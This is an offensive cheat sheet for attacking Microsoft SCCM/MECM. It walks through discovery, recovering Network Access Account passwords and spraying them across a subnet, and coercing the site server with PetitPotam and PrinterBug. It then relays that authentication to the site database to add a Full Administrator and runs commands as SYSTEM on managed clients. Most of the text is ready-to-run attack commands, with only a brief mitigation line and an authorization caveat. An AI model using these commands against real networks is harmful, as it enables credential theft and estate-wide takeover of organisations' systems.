SCCM / MECM Attacks - Cheat Sheet

SCCM (now MECM / ConfigMgr) manages software, patches, and OS deployment across
the whole estate - so it holds powerful credentials and reaches every client.
Abuse it to recover Network Access Account (NAA) creds, relay the site server's
machine account, and ultimately take over the site (and often the domain).
Tooling: SCCMHunter, sccmwtf, ntlmrelayx. Use nxc for follow-on access.
Replace the placeholders (<...>) with your own values.


Step 1 - Find SCCM in the domain

SCCM advertises itself in AD (System Management container + sites):

    # SCCMHunter - find management points, site servers, roles
    sccmhunter find -u <user> -p <password> -d <domain> -dc-ip <dc-ip>

    # quick LDAP look for the System Management container objects
    nxc ldap <dc-ip> -u <user> -p <password> -M maq    # (also note MAQ for later)

Identify: the Site Server, Management Point (MP), and SMS Provider hosts.


Step 2 - Profile what you found

    sccmhunter smb -u <user> -p <password> -d <domain> -dc-ip <dc-ip>

This enumerates roles, site codes, and whether HTTP (vs HTTPS) is allowed on
the MP - HTTP enables the juicy credential-recovery and relay paths.


=== CREDENTIAL THEFT: Network Access Accounts (NAA) ===
NAA creds are handed to clients in policy so they can reach content - and they
are recoverable. Often a domain account with broad rights.

Step 3 - Recover NAA creds as a client (no creds needed if MP is HTTP)

    # sccmhunter / sccmwtf request machine policy and decrypt the NAA blob
    sccmhunter http -u <user> -p <password> -d <domain> -dc-ip <dc-ip> --na

    # sccmwtf alternative (policy request + decrypt)
    python3 sccmwtf.py <attacker-host> <MP-host> <site-code>

The output is a plaintext username + password for the NAA -> spray it:

    nxc smb <subnet>/24 -u <naa-user> -p <naa-pass>


=== TAKEOVER: relay the site server (SCCM site takeover) ===
The primary site server's machine account is admin on the site DB / other site
systems. Coerce it and relay to MSSQL or SMB to add yourself as a Full Admin.

Step 4 - Start the relay (target the site DB or another site system)

    impacket-ntlmrelayx -t mssql://<site-db-host> -smb2support \
        -q "USE CM_<site-code>; INSERT INTO RBAC_Admins ..."   # add SCCM admin
    # (sccmhunter automates the SQL: sccmhunter mssql ... -u <you> add admin)

Step 5 - Coerce the site server to authenticate to you

    # see authentication-coercion cheatsheet
    impacket-petitpotam <attacker-ip> <site-server-ip>
    impacket-printerbug <domain>/<user>:<password>@<site-server-ip> <attacker-ip>

The site server's machine auth hits ntlmrelayx -> relayed to MSSQL -> you are
added as a Full Administrator in SCCM.

Step 6 - Use SCCM Full Admin to own clients

As an SCCM admin you can push a "CMPivot" query or an application/script to ANY
client as SYSTEM - instant code execution across the estate:

    sccmhunter admin -u <you> -p <pass> -ip <site-server>
    > exec -id <device> -command "whoami"        # run as SYSTEM on a client


Other paths
  - Relay client/admin auth to the SMS Provider (AdminService API) to add an
    admin without touching the DB.
  - PXE / OSD: grab unattend / task-sequence variables (creds) from PXE boot
    media if PXE is enabled without a password.


Cautions
  - Adding an RBAC admin is loud and changes the SCCM DB - clean up / note it.
  - HTTPS-only MPs + Extended Protection (EPA) + signing break most relay paths.
  - Only test authorized environments.


Key idea: SCCM is a domain-wide administration plane. Two things make it gold:
it stores reusable credentials (NAA) that any client can recover, and its site
server is a high-privilege machine account you can coerce + relay to seize the
site - after which you push SYSTEM-level code to every managed host. It often
turns one low-priv foothold into estate-wide (and domain) compromise.
